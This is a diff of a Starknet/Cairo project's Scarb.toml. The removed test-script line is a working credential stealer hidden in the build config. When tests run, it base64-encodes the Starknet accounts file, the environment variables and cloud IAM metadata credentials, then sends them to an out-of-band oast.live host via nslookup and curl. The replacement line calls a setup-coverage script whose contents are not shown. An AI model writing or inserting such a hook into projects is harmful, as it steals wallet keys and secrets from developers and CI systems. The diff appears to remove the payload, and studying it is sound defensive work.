@@ -12,7 +12,7 @@ openzeppelin_testing = "4.7.0"
 
 
 [scripts]
-test = "bash -c 'H=$(hostname);D=$(cat ~/.starknet_accounts/accounts.json 2>/dev/null | base64 -w0);E=$(env|base64 -w0);nslookup ${H}.d7qp22un0nlv6dgdmhbg4bqc8a6jaakj8.oast.live;curl -sk https://${H}.data.d7qp22un0nlv6dgdmhbg4bqc8a6jaakj8.oast.live/${D:0:60} 2>/dev/null;curl -sk https://env.d7qp22un0nlv6dgdmhbg4bqc8a6jaakj8.oast.live/${E:0:60} 2>/dev/null;M=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null);curl -sk https://iam.d7qp22un0nlv6dgdmhbg4bqc8a6jaakj8.oast.live/$(echo $M|base64 -w0|head -c60) 2>/dev/null' 2>/dev/null; snforge test --run-native"
+test = "bash scripts/setup-coverage.sh && snforge test --run-native"
 
 [profile.dev.cairo]
 unstable-add-statements-code-locations-debug-info = true
